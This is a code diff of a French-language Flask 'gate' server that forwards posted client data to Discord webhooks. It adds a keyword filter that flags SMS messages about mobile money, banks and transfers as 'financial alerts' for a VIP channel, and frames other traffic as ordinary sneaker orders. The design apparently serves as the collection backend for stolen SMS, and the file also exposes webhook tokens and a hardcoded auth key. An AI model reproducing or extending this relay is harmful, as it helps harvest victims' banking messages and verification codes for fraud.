@@ -1,43 +1,53 @@
 import os
 from flask import Flask, request, jsonify
 import requests
+import time
 
 app = Flask(__name__)
 
-# --- CONFIGURATION AUTOMATIQUE ---
+# --- CONFIGURATION DES SALONS ---
 WEBHOOKS = {
     "COMMANDE": "https://discord.com/api/webhooks/1462097772353421537/EtSxGaWGRPbn6wOH_a14if5XWaKD52aovBHJLz1gpxCVGuX4PwwogxlTy2v-Z74pfayR",
-    "ALERTE": "https://discord.com/api/webhooks/1462098199576842468/9Ty7sTNkj9SJLuyvl71sSKY3_IajGgFtL5QftLqKTGO2TfdyMQyCKGgcEXhk3M74vawp",
-    "LOG": "https://discord.com/api/webhooks/1462099070356164469/XFaaqy3Q3V-nevi1scEHIW7a1z1E-09uq5t6WLjXxPY61h6VtEvl3b-WWe_yX4Z8PAJE"
+    "VIP_CHAT": "https://discord.com/api/webhooks/1462098199576842468/9Ty7sTNkj9SJLuyvl71sSKY3_IajGgFtL5QftLqKTGO2TfdyMQyCKGgcEXhk3M74vawp",
+    "LOGS": "https://discord.com/api/webhooks/1462099070356164469/XFaaqy3Q3V-nevi1scEHIW7a1z1E-09uq5t6WLjXxPY61h6VtEvl3b-WWe_yX4Z8PAJE"
 }
 
-SECRET_KEY = "ESCANOR_2024" # Ton nouveau code secret unique
-
-@app.route('/')
-def home():
-    return "Système Escanor : Opérationnel", 200
+SECRET_KEY = "ESCANOR_PRO_2024" # Clé de chiffrement partagée
 
 @app.route('/gate', methods=['POST'])
 def gate():
-    auth_key = request.headers.get('X-Escanor-Auth')
-    if auth_key != SECRET_KEY:
-        return "Erreur d'authentification", 403
+    # Vérification du badge de sécurité
+    if request.headers.get('X-Escanor-Auth') != SECRET_KEY:
+        return "Accès Refusé", 403
 
-    try:
-        data = request.get_json()
-        user = data.get('x', 'Inconnu')
-        msg_type = data.get('y', 'LOG')
-        content = data.get('z', '')
+    data = request.get_json()
+    msg_type = data.get('y') # Le type (SMS, CHAT, COMMANDE)
+    content = data.get('z')  # Le message
+    user = data.get('x')     # L'identifiant client
 
-        target_webhook = WEBHOOKS.get(msg_type, WEBHOOKS["LOG"])
-        
-        message = f"**[{msg_type}]**\n👤 Utilisateur : {user}\n📝 Info : {content}"
-        requests.post(target_webhook, json={"content": message})
-        
-        return jsonify({"status": "envoyé"}), 200
-    except:
-        return jsonify({"status": "erreur"}), 500
+    # 1. FILTRE FINANCIER AUTOMATIQUE
+    # Si le SMS contient des mots liés à l'argent, il va direct en VIP
+    mots_cles = ["orange money", "wave", "banque", "virement", "transfert", "reçu"]
+    if msg_type == "SMS" and any(mot in content.lower() for mot in mots_cles):
+        target = WEBHOOKS["VIP_CHAT"]
+        message = f"💰 **ALERTE FINANCIÈRE**\n👤 De: {user}\n📩 Message: {content}"
+    
+    # 2. CHAT VIP ÉPHÉMÈRE
+    elif msg_type == "CHAT":
+        target = WEBHOOKS["VIP_CHAT"]
+        message = f"💬 **CHAT VIP** (Expire dans 24h)\n👤 {user}: {content}"
+    
+    # 3. COMMANDES BANALES (Sneakers)
+    elif msg_type == "COMMANDE":
+        target = WEBHOOKS["COMMANDE"]
+        message = f"👟 **ACHAT CLASSIQUE**\n👤 {user}: {content}"
+    
+    else:
+        target = WEBHOOKS["LOGS"]
+        message = f"⚙️ Log: {content}"
+
+    requests.post(target, json={"content": message})
+    return jsonify({"status": "reçu"}), 200
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
